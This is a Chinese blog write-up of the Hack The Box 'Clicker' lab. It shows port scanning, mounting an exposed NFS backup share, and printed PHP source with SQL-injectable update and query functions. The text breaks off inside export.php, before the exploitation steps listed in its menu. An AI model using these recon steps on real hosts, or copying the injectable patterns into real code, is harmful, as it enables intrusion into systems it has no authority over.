<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>Clicker(HTB) Â· zIxyd's Blog</title><meta name="description" content="ä¿¡æ¯æœé›†nmap12345678910sudo nmap -p- -sT -min-rate 4000 10.10.11.232PORT      STATE SERVICE22/tcp    open  ssh80/tcp    open  http111/tcp   open  rpcbind2"><meta name="keywords" content="Blog,åšå®¢,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">ä¿¡æ¯æœé›†</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#NSF%E6%B3%84%E9%9C%B2%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toclist-text">NSFæ³„éœ²å¤‡ä»½æ–‡ä»¶</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-update%E6%B3%A8%E5%85%A5"><span class="toclist-text">æ¼æ´åˆ©ç”¨(updateæ³¨å…¥)</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%8D%87%E7%BA%A7role"><span class="toclist-text">å‡çº§role</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toclist-text">æ–¹æ³•ä¸€</span></a></li><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toclist-text">æ–¹æ³•äºŒ</span></a></li></ol></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%F0%9F%91%86%F0%9F%90%8E"><span class="toclist-text">ğŸ‘†ğŸ</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#user-www-data"><span class="toclist-text">user_www-data</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#user-jack"><span class="toclist-text">user_jack</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">ææƒ</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E8%A1%A5%E5%85%85"><span class="toclist-text">è¡¥å……</span></a></li></ol></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>å­˜æ”¾ä¸ªäººå­¦ä¹ ç¬”è®°çš„å°çªï¼Œæ¬¢è¿äº¤æµ</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toclist-text">ä¿¡æ¯æœé›†</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#nmap"><span class="toclist-text">nmap</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#NSF%E6%B3%84%E9%9C%B2%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6"><span class="toclist-text">NSFæ³„éœ²å¤‡ä»½æ–‡ä»¶</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-update%E6%B3%A8%E5%85%A5"><span class="toclist-text">æ¼æ´åˆ©ç”¨(updateæ³¨å…¥)</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%8D%87%E7%BA%A7role"><span class="toclist-text">å‡çº§role</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toclist-text">æ–¹æ³•ä¸€</span></a></li><li class="toclist-item toclist-level-5"><a class="toclist-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toclist-text">æ–¹æ³•äºŒ</span></a></li></ol></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%F0%9F%91%86%F0%9F%90%8E"><span class="toclist-text">ğŸ‘†ğŸ</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#user-www-data"><span class="toclist-text">user_www-data</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#user-jack"><span class="toclist-text">user_jack</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%8F%90%E6%9D%83"><span class="toclist-text">ææƒ</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E8%A1%A5%E5%85%85"><span class="toclist-text">è¡¥å……</span></a></li></ol></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> å…¨ç«™CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Clicker(HTB)</a></h3></div><div class="post-content"><p><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- -sT -min-rate 4000 10.10.11.232</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">111/tcp   open  rpcbind</span><br><span class="line">2049/tcp  open  nfs</span><br><span class="line">8000/tcp  open  http-alt</span><br><span class="line">36831/tcp open  unknown</span><br><span class="line">41197/tcp open  unknown</span><br><span class="line">59535/tcp open  unknown</span><br></pre></td></tr></table></figure>

<h4 id="NSFæ³„éœ²å¤‡ä»½æ–‡ä»¶"><a href="#NSFæ³„éœ²å¤‡ä»½æ–‡ä»¶" class="headerlink" title="NSFæ³„éœ²å¤‡ä»½æ–‡ä»¶"></a>NSFæ³„éœ²å¤‡ä»½æ–‡ä»¶</h4><p><code>2049/tcp  open  nfs</code></p>
<p><code>NFS</code>æ˜¯network file systemç¼©å†™ï¼Œç½‘ç»œæ–‡ä»¶ç³»ç»Ÿï¼Œç”¨æ¥æŒ‚åœ¨æŸä¸ªç›®å½•æˆ–æ–‡ä»¶è¿›è¡Œå…±äº«ï¼Œé»˜è®¤æ˜¯2049ç«¯å£ï¼ŒåŠŸèƒ½ç±»ä¼¼äºwindowsçš„å…±äº«,ä»¥é€šè¿‡<code>showmount</code>å‘½ä»¤æ¥åˆ—å‡ºç›®æ ‡æœºçš„å…±äº«ç›®å½•ï¼Œeå‚æ•°æ˜¾ç¤ºNFSæœåŠ¡å™¨çš„è¾“å‡ºæ¸…å•ã€‚</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ showmount -e 10.10.11.232                    </span><br><span class="line">Export list <span class="keyword">for</span> 10.10.11.232:</span><br><span class="line">/mnt/backups *</span><br><span class="line"></span><br><span class="line"><span class="comment">#/mnt/backupsç›®å½•è¢«ä»¥åªè¯»æ–¹å¼ï¼ˆ*ï¼‰å…±äº«å‡ºæ¥ï¼Œè¿™æ„å‘³ç€å…¶ä»–ä¸»æœºå¯ä»¥é€šè¿‡NFSåè®®æŒ‚è½½è¿™ä¸ªç›®å½•ï¼Œå¹¶ä¸”åªèƒ½ä»¥åªè¯»æ–¹å¼è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ã€‚</span></span><br><span class="line"></span><br><span class="line">sudo mount -t nfs   10.10.11.232:/mnt/backups /tmp/clicker</span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">cp</span> ./clicker.htb_backup.zip /home/kali</span><br><span class="line"></span><br><span class="line">unzip clicker.htb_backup.zip</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">æ€»è®¡ 64</span><br><span class="line">-rw-rw-r-- 1 kali kali 3934  9æœˆ 2æ—¥ 04:18 admin.php</span><br><span class="line">drwxr-xr-x 4 kali kali 4096 2023å¹´ 2æœˆ28æ—¥ assets</span><br><span class="line">-rw-rw-r-- 1 kali kali  608  9æœˆ 2æ—¥ 04:17 authenticate.php</span><br><span class="line">-rw-rw-r-- 1 kali kali  541  9æœˆ 2æ—¥ 04:17 create_player.php</span><br><span class="line">-rw-rw-r-- 1 kali kali 2536  9æœˆ 2æ—¥ 04:18 db_utils.php</span><br><span class="line">-rw-r--r-- 1 kali kali 1376  9æœˆ 2æ—¥ 04:18 diagnostic.php</span><br><span class="line">-rw-rw-r-- 1 kali kali 1977  9æœˆ 2æ—¥ 04:18 export.php</span><br><span class="line">drwxr-xr-x 2 kali kali 4096  9æœˆ 2æ—¥ 04:18 exports</span><br><span class="line">-rw-rw-r-- 1 kali kali 3887  9æœˆ 2æ—¥ 04:18 index.php</span><br><span class="line">-rw-rw-r-- 1 kali kali 3423  9æœˆ 2æ—¥ 04:18 info.php</span><br><span class="line">-rw-rw-r-- 1 kali kali 3301  9æœˆ 2æ—¥ 04:18 login.php</span><br><span class="line">-rw-rw-r-- 1 kali kali   74  9æœˆ 2æ—¥ 04:17 logout.php</span><br><span class="line">-rw-rw-r-- 1 kali kali 3341  9æœˆ 2æ—¥ 04:17 play.php</span><br><span class="line">-rw-rw-r-- 1 kali kali 3070  9æœˆ 2æ—¥ 04:17 profile.php</span><br><span class="line">-rw-rw-r-- 1 kali kali 3333  9æœˆ 2æ—¥ 04:18 register.php</span><br><span class="line">-rw-rw-r-- 1 kali kali  563  9æœˆ 2æ—¥ 04:18 save_game.php</span><br></pre></td></tr></table></figure>

<p>è´´å‡ ä¸ªéœ€è¦åˆ©ç”¨çš„æ–‡ä»¶</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#db_utils.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$db_server</span>=<span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$db_username</span>=<span class="string">&quot;clicker_db_user&quot;</span>;</span><br><span class="line"><span class="variable">$db_password</span>=<span class="string">&quot;clicker_db_password</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line"><span class="variable">$db_name</span>=<span class="string">&quot;clicker&quot;</span>;</span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$db_server</span>, <span class="variable">$db_username</span>, <span class="variable">$db_password</span>, <span class="variable">$db_name</span>);</span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:dbname=<span class="subst">$db_name</span>;host=<span class="subst">$db_server</span>&quot;</span>, <span class="variable">$db_username</span>, <span class="variable">$db_password</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_exists</span>(<span class="params"><span class="variable">$player</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">	<span class="variable">$params</span> = [<span class="string">&quot;player&quot;</span> =&gt; <span class="variable">$player</span>];</span><br><span class="line">	<span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT count(*) FROM players WHERE username = :player&quot;</span>);</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">	<span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchColumn</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$result</span> &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_new_player</span>(<span class="params"><span class="variable">$player</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">	<span class="variable">$params</span> = [<span class="string">&quot;player&quot;</span>=&gt;<span class="variable">$player</span>, <span class="string">&quot;password&quot;</span>=&gt;<span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$password</span>)];</span><br><span class="line">	<span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO players(username, n, password, role, clicks, level) VALUES (:player,:player,:password,&#x27;User&#x27;,0,0)&quot;</span>);</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_auth</span>(<span class="params"><span class="variable">$player</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">	<span class="variable">$params</span> = [<span class="string">&quot;player&quot;</span> =&gt; <span class="variable">$player</span>];</span><br><span class="line">	<span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT password FROM players WHERE username = :player&quot;</span>);</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">rowCount</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strcmp</span>(<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>], <span class="title function_ invoke__">hash</span>(<span class="string">&quot;=&quot;</span>,<span class="variable">$password</span>)) == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_profile</span>(<span class="params"><span class="variable">$player</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">	<span class="variable">$params</span> = [<span class="string">&quot;player&quot;</span>=&gt;<span class="variable">$player</span>];</span><br><span class="line">	<span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT nickname, role, clicks, level FROM players WHERE username = :player&quot;</span>);</span><br><span class="line">	<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">rowCount</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="variable">$row</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$row</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save_profile</span>(<span class="params"><span class="variable">$player</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">  	<span class="variable">$params</span> = [<span class="string">&quot;player&quot;</span>=&gt;<span class="variable">$player</span>];</span><br><span class="line">	<span class="variable">$setStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  	<span class="keyword">foreach</span> (<span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    		<span class="variable">$setStr</span> .= <span class="variable">$key</span> . <span class="string">&quot;=&quot;</span> . <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">quote</span>(<span class="variable">$value</span>) . <span class="string">&quot;,&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">  	<span class="variable">$setStr</span> = <span class="title function_ invoke__">rtrim</span>(<span class="variable">$setStr</span>, <span class="string">&quot;,&quot;</span>);</span><br><span class="line">  	<span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;UPDATE players SET <span class="subst">$setStr</span> WHERE username = :player&quot;</span>);</span><br><span class="line">  	<span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">execute</span>(<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ONLY FOR THE ADMIN</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_top_players</span>(<span class="params"><span class="variable">$number</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">	<span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT nickname,clicks,level FROM players WHERE clicks &gt;= &quot;</span> . <span class="variable">$number</span>);</span><br><span class="line">	<span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_current_player</span>(<span class="params"><span class="variable">$player</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$pdo</span>;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT nickname, clicks, level FROM players WHERE username = :player&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:player&#x27;</span>, <span class="variable">$player</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">rowCount</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#save_game.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;db_utils.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;PLAYER&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;PLAYER&#x27;</span>] != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">	<span class="variable">$args</span> = [];</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$key</span>) === <span class="string">&#x27;role&#x27;</span>) &#123;</span><br><span class="line">			<span class="comment">// prevent malicious users to modify role</span></span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /index.php?err=Malicious activity detected!&#x27;</span>);</span><br><span class="line">			<span class="keyword">die</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$args</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="title function_ invoke__">save_profile</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;PLAYER&#x27;</span>], <span class="variable">$_GET</span>);</span><br><span class="line">	<span class="comment">// update session info</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;CLICKS&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;clicks&#x27;</span>];</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;LEVEL&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;level&#x27;</span>];</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /index.php?msg=Game has been saved!&#x27;</span>);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#export.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">&quot;db_utils.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;ROLE&quot;</span>] != <span class="string">&quot;Admin&quot;</span>) &#123;</span><br><span class="line">  <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: /index.php&#x27;</span>);</span><br><span class="line">  <span 